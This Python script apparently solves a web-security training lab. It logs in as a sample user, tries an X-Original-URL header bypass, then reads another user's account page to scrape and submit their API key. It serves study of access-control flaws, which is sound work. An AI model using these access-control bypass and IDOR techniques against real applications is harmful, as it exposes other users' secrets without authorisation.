import requests
from bs4 import BeautifulSoup
import re
s = requests.Session()

site = 'acb11f661ec58d7d8035311600e3007a.web-security-academy.net'

login_url = f'https://{site}/login'
login_data = { 'password' : 'peter', 'username' : 'wiener'}
resp = s.post(login_url, data=login_data)

url = f'https://{site}/my-account/?id=carlos'
resp = s.get(url, headers = {'X-Original-URL' : '/admin'})
'print(resp.text)'

resp = s.get(url)
soup = BeautifulSoup(resp.text,'html.parser')
div_text = soup.find('div', text=re.compile('API')).text
api_key = div_text.split(' ')[4]
print(api_key)

url = f'https://{site}/submitSolution'
resp = s.post(url,data={'answer':api_key})